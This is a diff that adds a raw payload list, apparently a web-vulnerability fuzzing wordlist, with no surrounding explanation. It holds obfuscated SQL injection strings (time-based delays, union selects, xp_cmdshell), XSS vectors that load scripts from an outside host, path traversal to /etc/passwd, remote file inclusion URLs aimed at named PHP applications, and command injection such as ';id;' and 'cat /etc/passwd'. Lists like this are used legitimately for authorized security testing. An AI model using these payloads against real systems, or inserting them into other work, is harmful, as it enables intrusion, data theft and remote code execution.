@@ -1,0 +1,1201 @@
+/html/admin/modules/plugin_admin.php?_settings[pluginpath]=XXpathXX%00
+select /*!30309system_user from sysibm.sysdummy1;*/
+L3BocGxpYi92ZXJzaW9uLzEuMy4zL21vZHVsZS9yZWZlcmVuei5waHA/dHRfZG9jcm9vdD1YWHBhdGhYWA==
+"<?xml%0Aversion=""1.0""%0Cencoding=""ISO-8859-1""?><!DOCTYPE%09foo%0A[<!ELEMENT%09foo%0CANY><!ENTITY%0Axxe%0DSYSTEM%0C""file://c:/boot.ini"">]><foo>&xxe;</foo>"
+%C0%AE%C0%ABX0003C%C0%BB
+/linksnet_newsfeed/linksnet_linkslog_rss.php?dirpath_linksnet_newsfeed=XXpathXX? and '0having'='0having'
+%C0%ABif%C0%AAbenchmark%C0%AA3000000%C0%AEMD5%C0%AA1%C0%AB%C0%AB%C0%AENULL%C0%AENULL%C0%AB%C0%AENULL%C0%AENULL%C0%AENULL%C0%AENULL%C0%AB%20%C0%AF%C0%AF
+%/%x%a%r%g%_%c%o%r%n%e%r%_%t%o%p%.%p%h%p%?%x%a%r%g%=%X%X%p%a%t%h%X%X%?
+%27%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2F%2A
+<BASE /*!30877HREF="javascript:alert('XSS');//">*/
+&lt;BASE--%0AHREF=\"javascript&#058;alert('XSS');//\"&gt;
+a%C0%AF%C0%AAwaitfor%C0%AAdelay%C0%AA%C0%AF0%C0%BA0%C0%BA10%C0%AF%C0%AF%C0%AF
+/biblioteca/bib_save.php?CLASSPATH=XXpathXX%00
+%/%b%i%b%l%i%o%t%e%c%a%/%l%i%n%_%f%o%r%m%.%p%h%p%?%C%L%A%S%S%P%A%T%H%=%X%X%p%a%t%h%X%X
+'--%0Aor--%0A2--%0Abetween--%0A1--%0Aand--%0A5
+/plugins/spamx/DeleteComment./*!0Action.class.php?_CONF[/*!0path]=XXpathXX
+L0EtQmxvZy9uYXZpZ2F0aW9uL2xpbmtzLnBocD9uYXZpZ2F0aW9uX3N0YXJ0PVhYcGF0aFhYPw==
+/show%23zUrvEMhVdNu%0A.php?path%23wswIOS%0A=XXpathXX
+/index.php?_REQUEST=&_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=XXpathXX%00
+%256F%256E%254B%2565%2579%2550%2572%2565%2573%2573
+%3C%53%43%52%49%50%54%20%53%52%43%3D%22%68%74%74%70%3A%2F%2F%68%61%2E%63%6B%65%72%73%2E%6F%72%67%2F%78%73%73%2E%6A%70%67%22%3E%3C%2F%53%43%52%49%50%54%3E
+/index.php?lang=XXpathXX and '0having'='0having'
+' /*!00000or username like char(37);*/
+/..%c0%2f..%c0%2f..%c0%2f{FILE}%00
+/Blog_CMS/admin/plugins/NP_UserSharing.php?DIR_ADMIN=XXpathXX?admin and '0having'='0having'
+/include/lib/lib_slots.php?main_path=XXpathXX and '0having'='0having'
+%u0029%u002C%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u0029%u0020%u0077%u0061%u0069%u0074%u0066%u006F%u0072%u0020%u0064%u0065%u006C%u0061%u0079%u0020%u0027%u0030%u003A%u0030%u003A%u0032%u0030%u0027%u0020%u002F%u002A
+xxx%-1Aor%-1D3=3
+Ly5cXC4uXFwuXFwuLlxcLlxcLi5cXC5cXC4uXFwuXFwuLlxcLlxcLi5cXC5cXC4uXFwuXFwuLlxce0ZJTEV9
+/files/compose-new.php3?BSX_LIBDIR LIKE XXpathXX
+9999"||(select%08count(*)%07from%09INFORMATION_SCHEMA.tables%0Aas%0Csys1,INFORMATION_SCHEMA.tables%05as%09sys2,INFORMATION_SCHEMA.tables%07as%01sys3,INFORMATION_SCHEMA.tables%05as%0Esys4,INFORMATION_SCHEMA.tables%0Eas%03sys5,INFORMATION_SCHEMA.tables%02as%08sys6)||"9999
+/components/com_nfn_addressbook/nfnaddressbook.php?mosConfig_absolute_path LIKE XXpathXX?
+0x77616974666F722064656C61792027303A303A31302700%0Aexec(@s)
+%2527%2520%2541%254E%2544%2520%2531%253D%2575%2574%256C%255F%2569%256E%2561%2564%2564%2572%252E%2567%2565%2574%255F%2568%256F%2573%2574%255F%2561%2564%2564%2572%2565%2573%2573%2528%2528%2553%2545%254C%2545%2543%2554%2520%2544%2549%2553%2554%2549%254E%2543%2554%2528%2555%2553%2545%2552%254E%2541%254D%2545%2529%2520%2546%2552%254F%254D%2520%2528%2553%2545%254C%2545%2543%2554%2520%2544%2549%2553%2554%2549%254E%2543%2554%2528%2555%2553%2545%2552%254E%2541%254D%2545%2529%252C%2520%2552%254F%2557%254E%2555%254D%2520%2541%2553%2520%254C%2549%254D%2549%2554%2520%2546%2552%254F%254D%2520%2553%2559%2553%252E%2541%254C%254C%255F%2555%2553%2545%2552%2553%2529%2520%2557%2548%2545%2552%2545%2520%254C%2549%254D%2549%2554%253D%2538%2529%2529%2520%2541%254E%2544%2520%2527%2569%2527%253D%2527%2569
+%252F%252E%252E%2525%2575%2532%2532%2531%2535%252E%252E%2525%2575%2532%2532%2531%2535%252E%252E%2525%2575%2532%2532%2531%2535%257B%2546%2549%254C%2545%257D
+%u002F%u0062%u0069%u0067%u0061%u0063%u0065%u002F%u0073%u0079%u0073%u0074%u0065%u006D%u002F%u0061%u0064%u006D%u0069%u006E%u002F%u0070%u006C%u0075%u0067%u0069%u006E%u0073%u002F%u006D%u0065%u006E%u0075%u002F%u006D%u0065%u006E%u0075%u0054%u0072%u0065%u0065%u002F%u0070%u006C%u0075%u0067%u0069%u006E%u002E%u0070%u0068%u0070%u003F%u0047%u004C%u004F%u0042%u0041%u004C%u0053%u005B%u005F%u0042%u0049%u0047%u0041%u0043%u0045%u005D%u005B%u0044%u0049%u0052%u005D%u005B%u0061%u0064%u006D%u0069%u006E%u005D%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058%u003F
+/corpo.php?pagina=XXpathXX-- sp_password
+'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20---- sp_password
+UFJPUEZJTkQ=
+/admin/inc/change_action.jsp?format_menue=$$path$$
+%u002F%u0041%u0054%u0075%u0074%u006F%u0072%u002F%u0064%u006F%u0063%u0075%u006D%u0065%u006E%u0074%u0061%u0074%u0069%u006F%u006E%u002F%u0063%u006F%u006D%u006D%u006F%u006E%u002F%u0066%u0072%u0061%u006D%u0065%u005F%u0074%u006F%u0063%u002E%u0070%u0068%u0070%u003F%u0073%u0065%u0063%u0074%u0069%u006F%u006E%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+hi o/**/r a=a
+%2F%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%5C%2E%2E%5C%2E%2E%5C%2E%2E%5C%2E%2E%5C%2E%2E%5C%7B%46%49%4C%45%7D
+/BE_config.aspx?_PSL[classdir]=EEpathEE
+/w-agora_path/add_user.php?bn_dir_default=XXpathXX?-- sp_password
+<FRAMESET><FRAME%23%0ASRC="javascript:alert('XSS');"></FRAMESET>
+/gallery/lib/content.php?include LIKE XXpathXX?cmd LIKE ls
+# from wapiti and '0having'='0having'
+L29wZW5pLWFkbWluL2Jhc2UvZmlsZWxvYWRlci5waHA/Y29uZmlnW29wZW5pX2Rpcl09WFhwYXRoWFg=
+<IMG/**/SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+pwd%00
+/index.php?includeFooter=XXpathXX and '0having'='0having'
+") and 0=benchmark(3000000,MD5(1))%20--
++|+Dir+c:%255c
+/Bcwb_PATH/include/startup.inc.php?root_path_admin=XXpathXX
+/supasite/admin_utilities.php?supa[db_path]=XXpathXX%00
+23 OR 1 BETWEEN 1 AND 1
+PElNRyBTUkM9JiN4NkEmI3g2MSYjeDc2JiN4NjEmI3g3MyYjeDYzJiN4NzImI3g2OSYjeDcwJiN4NzQmI3gzQSYjeDYxJiN4NkMmI3g2NSYjeDcyJiN4NzQmI3gyOCYjeDI3JiN4NTgmI3g1MyYjeDUzJiN4MjcmI3gyOT4=
+%'%)%;%w%a%i%t%f%o%r %d%e%l%a%y %'%0%:%0%:%_%_%T%I%M%E%_%_%'%-%-
+/admin/index_sitios.php?_VIEW=XXpathXX-- sp_password
+%2531%2525%252D%2531%2541%256F%2572%2525%252D%2531%2544%2532%253D%2532
+/0x2e0x2e\0x2e0x2e\{FILE} and '0having'='0having'
+y'%05AND%03members.email%0FIS%07NULL;%08--
+1%0Aor%0D2=2%00
+%C0%AFservices%C0%AFsamples%C0%AFinclusionService%C0%AEphp%C0%BFCabronServiceFolder%C0%BFXXpathXX%00
+%C0%AFinclude%C0%AFcustomize%C0%AEphp%C0%BFl%C0%BFXXpathXX%C0%AEtext%C0%BFHello%20World
+%&%#%X%0%0%0%0%3%C
+%C0%AF%C0%AA%C0%AF%C0%AF%C0%AA%C0%AEpassword%C0%BF
+/plugins/spamx/MTBlackList.Examine.class.php?_CONF[path]=XXpathXX and '0having'='0having'
+/studip-1.3.0-2/studip-htdocs/archiv_assi.php?cmd=ls%20-al&ABSOLUTE_PATH_STUDIP=XXpathXX?-- sp_password
+%/%s%t%r%e%a%m%l%i%n%e%-%1%.%0%-%b%e%t%a%4%/%s%r%c%/%c%o%r%e%/%t%h%e%m%e%/%i%n%c%l%u%d%e%s%/%a%c%c%o%u%n%t%_%f%o%o%t%e%r%.%p%h%p%?%s%l%_%t%h%e%m%e%_%u%n%i%x%_%p%a%t%h%=%X%X%p%a%t%h%X%X
+1)) or sleep(__TIME__)#
+/classes/Auth/OpenID/DumbStore.php?_ENV[asicms][path]=XXpathXX-- sp_password
+';%23JQPxCsl%0Aexec%23MTvZYGuay%0A%23YTodbGccbE%0Amaster..xp_cmdshell%23zBCXrEkDXLK%0A'ping%23viyMhnlpsSKh%0A172.10.1.255'--
+%C0%AFindex%C0%AEphp%C0%BFclass%C0%DFpath%C0%BFXXpathXX%C0%BF
+%2F%30%78%32%65%30%78%32%65%2F%30%78%32%65%30%78%32%65%2F%30%78%32%65%30%78%32%65%2F%30%78%32%65%30%78%32%65%2F%7B%46%49%4C%45%7D
+/system/includes/pageheaderdefault.inc.php?_sysSessionPath=XXpathXX-- sp_password
+/library/authorize.php?login_form=XXpathXX?-- sp_password
+L2Z1bmN0aW9ucy5waHA/c1twaHBwYXRoXT1YWHBhdGhYWA==
+<SCRIPT--%0Aa=">'>"--%0ASRC="http://ha.ckers.org/xss.js"></SCRIPT>
+y %bf%27 or 2 between 1 and 3
+IF(SUBSTR(@@/*!version*/,1,1)<5,BENCHMARK(2000000,SHA1(0xDEADBEEF)),SLEEP(3))/*’XOR(/*!IF*/(SUBSTR(@@/*!version*/,1,1)<5,BENCHMARK(2000000,SHA1(0xDEADBEEF)),SLEEP(3)))/*!OR*/’|”XOR(/*!IF*/(SUBSTR(@@/*!version*/,1,1)<5,BENCHMARK(2000000,SHA1(0xDEADBEEF)),SLEEP(3)))/*!OR*/”*/
+/news/include/customize.php?l=XXpathXX? and '0having'='0having'
+<script>({0:#0=alert/#0#/#0#(0)})</script> and '0having'='0having'
+%2F%76%65%64%69%74%2F%65%64%69%74%6F%72%2F%65%64%69%74%5F%68%74%6D%6C%61%72%65%61%2E%70%68%70%3F%68%69%67%68%6C%69%67%68%74%65%72%3D%58%58%70%61%74%68%58%58%3F
+%u0061%u0029%u003B%u002F%u0075%u0073%u0072%u002F%u0062%u0069%u006E%u002F%u0069%u0064%u007C
+%C0%AFincludes%C0%AFprofilcp%C0%DFconstants%C0%AEphp%C0%BFmodule%C0%DFroot%C0%DFpath%C0%BFXXpathXX%C0%BF
+/phplib/version%23tWQmtMXbKyK%0A/1.3.3/functionen/ref_kd_rubrik.php?tt_docroot=XXpathXX
+%u003C%u0053%u0043%u0052%u0049%u0050%u0054%u003E%u0064%u006F%u0063%u0075%u006D%u0065%u006E%u0074%u002E%u0077%u0072%u0069%u0074%u0065%u0028%u0022%u003C%u0053%u0043%u0052%u0049%u0022%u0029%u003B%u003C%u002F%u0053%u0043%u0052%u0049%u0050%u0054%u003E%u0050%u0054%u0020%u0053%u0052%u0043%u003D%u0022%u0068%u0074%u0074%u0070%u003A%u002F%u002F%u0068%u0061%u002E%u0063%u006B%u0065%u0072%u0073%u002E%u006F%u0072%u0067%u002F%u0078%u0073%u0073%u002E%u006A%u0073%u0022%u003E%u003C%u002F%u0053%u0043%u0052%u0049%u0050%u0054%u003E
+1;/*!SELECT*/%20*
+%2F%25%63%30%25%61%65%25%63%30%25%61%65%2F%25%63%30%25%61%65%25%63%30%25%61%65%2F%25%63%30%25%61%65%25%63%30%25%61%65%2F%7B%46%49%4C%45%7D
+/shop/page.php?osCsid=XXpathXX?
+'/*!0or 1=1/*!0or '1'='1
+%%%p%%%p%%%p%%%p
+'%09or%0D1=1--
+<IMG--LqMZIBZwv%0ASRC="javascript:alert('XSS')"
+%/%d%f%d%_%c%a%r%t%/%a%p%p%.%l%i%b%/%p%r%o%d%u%c%t%.%c%o%n%t%r%o%l%/%c%o%r%e%.%p%h%p%/%c%u%s%t%o%m%e%r%.%a%r%e%a%/%c%u%s%t%o%m%e%r%.%b%r%o%w%s%e%.%s%e%a%r%c%h%.%p%h%p%?%s%e%t%_%d%e%p%t%h%=%X%X%p%a%t%h%X%X%?
+<%00
+") an/**/d 0=benchmark(3000000,MD5(1))%20/*
+L2J1L3Byb2Nlc3MucGhwP2J1X2Rpcj1YWHBhdGhYWD8=
+/timedifference.php?la=XXpathXX
+/..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{FILE} and '0having'='0having'
+")))/**/waitfor/**/delay/**/'0:0:20'/**/--
+y' /*!30969or 1=1 or 'y'='y*/
+&lt;STYLE--%0Atype=\"text/css\"&gt;BODY{background&#58;url(\"javascript&#058;alert('XSS')\")}&lt;/STYLE&gt;
+"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))---- sp_password
+<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>-- sp_password
+&lt;SCRIPT%23CchsuDi%0ASRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js?&lt;B&gt;
+/....\....\....\....\....\....\{FILE}-- sp_password
+x' AND email IS NULL; --
+'--RmssOKGZ%0Aunion+select+user,null,null,null,null+from+dual每
+"<HTML%23xLgQyPD%0Axmlns:xss><?import%23CWvuSV%0Anamespace=""xss""%23QAMRLQtJgmCZ%0Aimplementation=""http://ha.ckers.org/xss.htc""><xss:xss>XSS</xss:xss></HTML>"
+%C0%AF%C0%AAunion%C0%ABselect%C0%ABowner%C0%AEnull%C0%AEnull%C0%AEnull%C0%AEnull%C0%ABfrom%C0%ABall%C0%DFtables%C0%AAC
+/bu/bu_claro.php?bu_dir=XXpathXX?
+' or username like '%%00
+',null)%20waitfor%20delay%20'0:0:20'%20--
+%2C%4E%55%4C%4C%2C%4E%55%4C%4C%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2D%2D
+%u002F%u0077%u0065%u0062%u002F%u0042%u0065%u0074%u0061%u0042%u006C%u006F%u0063%u006B%u004D%u006F%u0064%u0075%u006C%u0065%u0073%u002F%u0052%u0065%u0067%u0069%u0073%u0074%u0065%u0072%u004D%u006F%u0064%u0075%u006C%u0065%u002F%u0052%u0065%u0067%u0069%u0073%u0074%u0065%u0072%u004D%u006F%u0064%u0075%u006C%u0065%u002E%u0070%u0068%u0070%u003F%u0070%u0061%u0074%u0068%u005F%u0070%u0072%u0065%u0066%u0069%u0078%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+/download_engine_V1.4.3/admin/includes/spaw/dialogs/colorpicker.php?spaw_root LIKE XXpathXX
+%63%72%65%61%74%65%20%74%61%62%6C%65%20%6D%79%66%69%6C%65%20%28%6C%69%6E%65%20%76%61%72%63%68%61%72%28%38%30%30%30%29%29%22%20%62%75%6C%6B%20%69%6E%73%65%72%74%20%66%6F%6F%20%66%72%6F%6D%20%27%63%3A%5C%69%6E%65%74%70%75%62%5C%77%77%77%72%6F%6F%74%5C%61%75%74%68%2E%61%73%70%3F%22%20%73%65%6C%65%63%74%20%2A%20%66%72%6F%6D%20%6D%79%66%69%6C%65%22%2D%2D
+/joinus.php?vwar_root=XXpathXX?&cmd=ls-- sp_password
+"+/*!if*/(benchmark(3000000,MD5(1)),/*!NULL*/,/*!NULL*/),/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/)%20--
+/belegungsplan/monatsuebersicht.inc.aspx?root=EEpathEE
+'))))) /*!30284waitfor delay '0:0:20' *//*
+%2F%68%65%6C%70%2E%70%68%70%3F%43%4F%4E%46%49%47%5B%4D%57%43%48%41%54%5F%4C%69%62%73%5D%3D%58%58%70%61%74%68%58%58%3F
+L2Jpbi9xdGVfaW5pdC5waHA/cXRlX3Jvb3Q9WFhwYXRoWFg/
+/CSLH2_path/txt-db-api/util.php?API_HOME_DIR=XXpathXX?-- sp_password
+&#x003c;
+9999'||(select+count(*)+from+sysibm.systables+as+t1,sysibm.systables+as+t2,sysibm.systables+as+t3)||'9999
+L2VkaXRwcm9maWxlLnBocD9wYXRodG9ob21lZGlyPVhYcGF0aFhYPw==
+"a""%23iBrYuY%0Aor%23InFemhh%0A%23TxaaVOabEfK%0A1=1--"
+%C0%AF%C0%AE%C0%AE%C0%AE%C0%AE%C0%DE%C0%AE%C0%AE%C0%AE%C0%AE%C0%DE%C0%AE%C0%AE%C0%AE%C0%AE%C0%DE%C0%AE%C0%AE%C0%AE%C0%AE%C0%DE%C0%AE%C0%AE%C0%AE%C0%AE%C0%DE%C0%AE%C0%AE%C0%AE%C0%AE%C0%DE%C0%AE%C0%AE%C0%AE%C0%AE%C0%DE%C0%FBFILE%C0%FF
+&lt;IMG /*!30630STYLE=\"xss&*/#58;expr/*XSS*/ession(alert('XSS'))\"&gt;
+%C0%AFindex%C0%AEphp%C0%BFfile%C0%DFpath%C0%BFXXpathXX%C0%BF
+<LINK%0AREL="stylesheet"%0BHREF="http://ha.ckers.org/xss.css">
+%2F%61%64%6D%69%6E%69%73%74%72%61%74%6F%72%2F%63%6F%6D%70%6F%6E%65%6E%74%73%2F%63%6F%6D%5F%63%68%72%6F%6E%6F%63%6F%6E%74%61%63%74%2F%65%78%63%65%6C%77%72%69%74%65%72%2F%50%50%53%2F%46%69%6C%65%2E%70%68%70%3F%6D%6F%73%43%6F%6E%66%69%67%5F%61%62%73%6F%6C%75%74%65%5F%70%61%74%68%3D%58%58%70%61%74%68%58%58%3F
+/Path_Script/createurl.aspx?formurl=EEpathEE
+L3dhcGNoYXQvc3JjL2VuZy5zZWFyY2hNZW1iZXIucGhwP3N5c0ZpbGVEaXI9WFhwYXRoWFg=
+or%C0%AAisNULL%C0%AA1%C0%AF0%C0%AB%C0%AA%C0%AF%C0%AA
+/administrator/components/com_wmtgallery/admin.wmtgallery.php?mosConfig_live_site=XXpathXX%00
+%/%c%o%d%e%/%b%e%r%y%l%i%u%m%-%c%l%a%s%s%e%s%.%p%h%p%?%b%e%r%y%l%i%u%m%r%o%o%t%=%X%X%p%a%t%h%X%X%?
+<DIV /*!00000STYLE="background-image: url(javascript:alert('XSS'))">*/
+%2554%2552%2541%2543%2545
+%252F%256D%256F%2564%2575%256C%2565%2573%252F%2534%256E%2541%256C%2562%2575%256D%252F%2570%2575%2562%256C%2569%2563%252F%2564%2569%2573%2570%256C%2561%2579%2543%2561%2574%2565%2567%256F%2572%2579%252E%2570%2568%2570%253F%2562%2561%2573%2565%2570%2561%2574%2568%253D%2558%2558%2570%2561%2574%2568%2558%2558
+%2F%6D%6F%64%75%6C%65%73%2F%70%68%6F%6E%65%73%2F%69%6E%64%65%78%2E%70%68%70%3F%66%75%6C%6C%5F%70%61%74%68%3D%58%58%70%61%74%68%58%58
+%C0%AFinclude%C0%AFinc%C0%DFext%C0%AFspaw%C0%AFdialogs%C0%AFtable%C0%AEphp%C0%BFspaw%C0%DFroot%C0%BFXXpathXX
+")--%0Aand--%0A0=benchmark(3000000,MD5(1))%20/*
+%2B%69%66%28%62%65%6E%63%68%6D%61%72%6B%28%33%30%30%30%30%30%30%2C%4D%44%35%28%31%29%29%2C%4E%55%4C%4C%2C%4E%55%4C%4C%29%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%29%20%2D%2D
+%2F%62%69%67%61%63%65%2F%61%64%64%6F%6E%2F%73%6D%61%72%74%79%2F%70%6C%75%67%69%6E%73%2F%66%75%6E%63%74%69%6F%6E%2E%63%61%70%74%63%68%61%2E%70%68%70%3F%47%4C%4F%42%41%4C%53%5B%5F%42%49%47%41%43%45%5D%5B%44%49%52%5D%5B%61%64%64%6F%6E%5D%3D%58%58%70%61%74%68%58%58
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20---- sp_password
+%2526%2523%2530%2530%2530%2530%2536%2530
+9999'||(select%04count(*)%0Bfrom%0Bdomain.domains%07as%09t1,domain.columns%02as%07t2,domain.tables%04as%0Dt3)||'9999
+%2523%2520%2563%2572%2565%2564%2569%2574%2520%2574%256F%2520%2572%2573%256E%2561%256B%2565
+/podcastgen1.0beta2/core/admin/categories_add.php?absoluteurl=XXpathXX-- sp_password
+%2577%2568%256F%2561%256D%2569
+%/%.%.%2f%.%.%2f%.%.%2f%.%.%2f%.%.%2f%.%.%2f%.%.%2f%.%.%2f%{%F%I%L%E%}
+%253C%2554%2541%2542%254C%2545%253E%253C%2554%2544%2520%2542%2541%2543%254B%2547%2552%254F%2555%254E%2544%253D%2522%256A%2561%2576%2561%2573%2563%2572%2569%2570%2574%253A%2561%256C%2565%2572%2574%2528%2527%2558%2553%2553%2527%2529%2522%253E
+%26%6C%74%3B%4C%49%4E%4B%20%52%45%4C%3D%5C%22%73%74%79%6C%65%73%68%65%65%74%5C%22%20%48%52%45%46%3D%5C%22%6A%61%76%61%73%63%72%69%70%74%26%23%30%35%38%3B%61%6C%65%72%74%28%27%58%53%53%27%29%3B%5C%22%26%67%74%3B
+&lt;BR/*!SIZE*/=\"&{alert('XSS')}\"&gt;
+%o%n%R%e%s%i%z%e
+;id;
+/dosearch.php?RESPATH=XXpathXX
+/ADd.cgi.php?blog_theme=XXpathXX
+/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../{FILE}%00
+)--ZHtXOe%0Aunion--kXlzyS%0Aselect--xmLrVI%0A*--QoAHkx%0Afrom--MwlrOJDD%0Ainformation_schema.tables;
+/..%%35%63..%%35%63..%%35%63{FILE}-- sp_password
+") oR pg_sleep(__TIME__)--
+%u002F%u0069%u006E%u0064%u0065%u0078%u002E%u0070%u0068%u0070%u003F%u0069%u006E%u0073%u0050%u0061%u0074%u0068%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+\x3c
+1%0Dor%09(select%0Ccount(*)%0Cfrom%0CINFORMATION_SCHEMA.tables%0Das%09sys1,INFORMATION_SCHEMA.tables%0Cas%09sys2,INFORMATION_SCHEMA.tables%0Aas%0Csys3,INFORMATION_SCHEMA.tables%0Aas%0Asys4,INFORMATION_SCHEMA.tables%0Aas%0Dsys5,INFORMATION_SCHEMA.tables%0Aas%09sys6)=0%0Dor%0A1=1
+%u002F%u0062%u0075%u002F%u0062%u0075%u005F%u0063%u006C%u0061%u0072%u006F%u002E%u0070%u0068%u0070%u003F%u0062%u0075%u005F%u0064%u0069%u0072%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058%u003F
+cat+/etc/passwd
+or /*!00000a = a*/
+/PhotoCart/adminprint.php?admin_folder=XXpathXX%00
+/config/config_member.php?INC=XXpathXX? and '0having'='0having'
+/Exoaspxdesk_PATH/pipe.aspx?lang_file=EEpathEE
+%253C%2566%256F%2572%256D%253E%253C%2562%2575%2574%2574%256F%256E%2520%2566%256F%2572%256D%2561%2563%2574%2569%256F%256E%253D%2522%256A%2561%2576%2561%2573%2563%2572%2569%2570%2574%253A%2561%256C%2565%2572%2574%2528%2558%2553%2553%2529%2522%253E%256C%256F%256C
+/BetaBlockModules/RecentCommentsModule/RecentCommentsModule.php?path_prefix=XXpathXX-- sp_password
+%2F%2E%2F%2F%2E%2E%2F%2F%2E%2F%2F%2E%2E%2F%2F%7B%46%49%4C%45%7D
+%252F%252E%252E%25c0%252f%252E%252E%25c0%252f%252E%252E%25c0%252f%257B%2546%2549%254C%2545%257D
+<?--HayPzRuQKAx%0Afoo="><script>alert(1)</script>">
+%27%20%61%6E%64%20%30%3D%62%65%6E%63%68%6D%61%72%6B%28%33%30%30%30%30%30%30%2C%4D%44%35%28%31%29%29%20%2D%2D
+/\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\s\/\\\/\\ss\/\\\/\\ss\/\\\/\\ss\/\\\/\\ss\/\\\/\\ss\/\\\/\\ss\/\\\/\\ss\/\\\/\\ss\/\\\/\\{/\\/\\etc/\\/\\passwd}
+9999"||(select--TBaQAwcfzHti%0A99999999--ZcxamewOi%0Afrom--GnLcZcO%0Apg_sleep(15))||"9999
+/template/rwb/user_bottom.php?config[template_path]=XXpathXX and '0having'='0having'
